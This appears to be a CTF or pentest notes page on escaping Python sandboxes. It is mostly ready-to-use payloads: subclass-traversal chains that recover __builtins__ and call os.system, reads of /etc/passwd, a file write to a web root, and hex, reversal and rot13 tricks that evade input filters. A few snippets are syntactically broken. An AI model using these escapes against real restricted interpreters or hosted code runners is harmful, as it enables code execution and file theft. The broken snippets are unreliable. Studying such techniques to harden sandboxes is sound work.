---
description: >-
  All internal quotes would be single quotes and all outer quotes will be double
  quotes
---

# Bypass Python Sandbox

## Understanding String Quotes

```text
str = ''' This is a string'''
str = 'This is a string'
str = "This is a string"

Multiline_Nested_str = '''
This is a string1 'This is string2'
This is another string1
'''

compressed_above_str = "\nThis is a string1 '\nThis is another string1\n"

Nested_str = "This is string1 and 'This is string2 and \' This is string3 \''"
Nested_str = " This is string0 'string1 \" and string2 \' and string3 \' \" and another string1' and another string0"

```

## Alternative.to

* You can perform a task in multiple ways, below is a list of all different ways used to perform the same action.
* Alternatives to python os module
  * [https://www.python-course.eu/os\_module\_shell.php](https://www.python-course.eu/os_module_shell.php)
* Alternatives to file read
* Alternatives to importing libraries and execution

```python
### Alternatives to os module and execution #########################################
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls") 
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
platform.popen("ls").read()



### Alternatives to os file read/write #############################################
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')



### Alternatives to importing libraries and execution ##############################
# 1
import os
from os import *
__import__('os').system("ls")

# 2
sys.modules["os"].system("ls")

#3 - python2
execfile('/usr/lib/python2.7/os.py')
system('ls')

# 4
cmd = '''i=().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os')\ni.system('sleep 20')'''

# 5
cmd = '''{}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').system('sleep 20')'''

#6
cmd = '''''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get('linecache').os.popen('sleep 20').read()'''

#7
##### Steps : First restore "builtins", then import "builtin" and them use builtin to import "os"
cmd = '''
__builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)
__builtin__=__builtins__["__import__"]('__builtin__')
__builtin__.__dict__['__import__']('os').system(ls')
'''
```

## Defenses in a python sandbox

1. Forbidden characters or input validation
2. No builtin present
   * `exec('cmd', {'__builtins__': None})`
3. Restriction on importing libraries 
   * `sys.modules['os'] = 'not allowed'`
   * Skip execution if os shell modules are executed.

## 1. Bypass - Forbidden characters or input validation

### Encoding to byte code

* We can encode forbidden characters in their encoded form. Here we used hex encoded as it works smoothly as compared to octal encoding.
* Target command
  * `exec("print('RCE'); __import__('os').system('ls')")`
* Updated command, after converting payload to hex bypte code
  * `exec("\x5bi for i in \x28)\x2e\x5f\x5fclass\x5f\x5f\x2e\x5f\x5fbases\x5f\x5f\x5b0]\x2e\x5f\x5fsubclasses\x5f\x5f\x28) if i\x2e\x5f\x5fname\x5f\x5f=='catch\x5fwarnings']\x5b0]\x28)\x2e\x5fmodule\x2e\x5f\x5fbuiltins\x5f\x5f")`

### Transform string

* You also play with transforming the string to escape harcoded input validation
  * Example, if validation check if `import os` is present or not. 
* Evasion1 : string concat at runtime after validation
  *  `a='o'\nb='s'\nimport a+b \n os.system('whoami')`
* Evasion2 : reversing the string 
  * `import('so'[::-1]).system('whoami')`
  * `eval(')"whoami"(metsys.)"so"(__tropmi__'[::-1])`
  * `exec(')"imaohw"(metsys.so ;so tropmi'[::-1])`
* Evasion3 : encoding and 'decoding at runtime'
  * Command to execute
    * `f3ck = __import__ commands` 
    * `print commands.getoutput("ls")` 
  * Evasion3 command
    * `f3ck = __import__("pbzznaqf".decode('rot_13'))` 
    * `print f3ck.getoutput('ifconfig')`

## 2. No builtins present

### \_\_builtins\_\_ vs \_\_builtin\_\_

* Information
  * `In Python 2.7.17 and 3.8.5 : __builtins__` is a library which is imported automatically which serves for builtin functions that we use in python script like len\(\), range\(\) , etc.
  * `In Python 2.7.17 : __builtin__`  is a library not imported automatically, when python code is executed, hence we need to manually import it inside python script in order to use it.
  * Generally, we will focus on restoring `__builtins__` if it is not there. Becuase if `__builtins__` is not restored, then we cannot call import `__builtin__` to import builtin.
* In python version 2.7.18
  * `__builtin__` is a module that stores all built in functions.
  * Both `__builtin__` and `__builtins__` are exactly the same
  * You could print all built in functions using `dir(__builtin__)`
  * All functions except print will work normally, to execute print normally you need to first run `from __future__ import print_function`

{% tabs %}
{% tab title="Python2" %}
![](../../../.gitbook/assets/image%20%28156%29.png)
{% endtab %}

{% tab title="Python3" %}
![](../../../.gitbook/assets/image%20%28157%29.png)
{% endtab %}
{% endtabs %}

* Hence 
  * `__builtins__` : is actually a library required for python execution, and we do not need to import it.
  * `__builtin__` : is a python2 library that we can import in python session.
* so if `exec("cmd", {'__builtins__': None})` means it has removed the required library and hence, now we cannot run any builtin functions like len\(\) or range\(\) , etc.

### Using \_\_builtins\_\_

* Check how to call \_\_builtins\_\_
  * \_\_builtins\_\_.\_\_dict\_\_\['\_\_import\_\_'\]\('time'\).sleep\(20\)
* Check if a module is present in builtins
  * `'__import__' in dir(__builtins__)`
  * `'eval' in dir(__builtins_)`
  * `'execfile' in dir(__builtins__)`

###  Using \_\_builtin\_\_

* Check how to call \_\_builtin\_\_
  * import \_\_builtin\_\_
  * \_\_builtins\_\_.\_\_dict\_\_\['\_\_import\_\_'\]\('time'\).sleep\(20\)

```python
# Examples
import __builtin__
__builtin__.len("hello")
__builtin__.range(1,20)
#__builtin__.print("hello") # Print will not work as we need other libraries
from __future__ import print_function
__builtin__.print("hello") # Now print will work :-)

# Importing other modules using builtin
__builtin__.__dict__['__import__']("os").system("ls")
```

![Print using \_\_builtin\_\_](../../../.gitbook/assets/image%20%28138%29.png)

### Recovering \_\_builtins\_\_

* [https://programmer.help/blogs/python-sandbox-escape.html](https://programmer.help/blogs/python-sandbox-escape.html)
* [https://github.com/se162xg/notes/issues/6](https://github.com/se162xg/notes/issues/6)
* [https://www.python-course.eu/os\_module\_shell.php](https://www.python-course.eu/os_module_shell.php)
* [https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes\#builtins](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes#builtins)
* some more references
  * [https://gynvael.coldwind.pl/n/python\_sandbox\_escape](https://gynvael.coldwind.pl/n/python_sandbox_escape)
  * [https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
  * [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
  * [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)

{% tabs %}
{% tab title="Python2" %}
```python
# 1 : recover __builtins__ in make eveything easier
__builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)
__builtins__['__import__']('os').system('sleep 20')
__builtins__['__import__']('time').sleep(20)


# 2 : 
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
i=()


# 3 : Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('sleep 20')")



# 4 : Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
#().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
i=().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os')\ni.system('sleep 20')
i=().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('time')\ni.sleep(20)


# 5
{}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').system('sleep 20')



#6 - check
{}.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get('linecache').os.popen('sleep 20').read()
# 6 - check
().__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get('linecache').os.popen('sleep 20').read()


#7
##### Steps : First restore "builtins", then import "builtin" and them use builtin to import "os"
__builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)
__builtin__=__builtins__["__import__"]('__builtin__')
__builtin__.__dict__['__import__']('os').system('sleep 20')
__builtin__.__dict__['__import__']('os').system('sleep 20')


# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")


# 120 : # This will not restore __builtins__ , but can be used if some modules are restricted in __builtins__
# Working : Try to reload __builtins__ but we need the reload() builtin function in __bultins__
reload(__builtins__)
__builtins__["__import__"]('os').system('ls')
__builtins__["__import__"]('time').sleep(20)
```
{% endtab %}

{% tab title="Python3" %}
```text
get_flag.__globals__['__builtins__'].__import__("os").system("ls")
```
{% endtab %}
{% endtabs %}

### Recovering file read / write

{% tabs %}
{% tab title="Python2" %}
```python
# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
```
{% endtab %}
{% endtabs %}

## 3. Restriction on importing libraries 

#### restore `sys.modules`

When `os` is removed from `sys.modules`, it cannot be used anymore.

```text
wrong way:

''' when importing a module, a new object would be created because there is not such a key in the dictionary'''
>>> del sys.modules['os']

correct way:

>>> sys.modules['os'] = 'not allowed'
>>> import os
>>> os.system('ls')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: 'str' object has no attribute 'system'
```

**bypass it**

```text
sys.modules['os'] = 'not allowed' # 

del sys.modules['os']
import os
os.system('ls')
```

#### execute forbidden method

```text
import os
getattr(os, 'metsys'[::-1])('whoami')

os.__getattribute__('system')('ls')
```

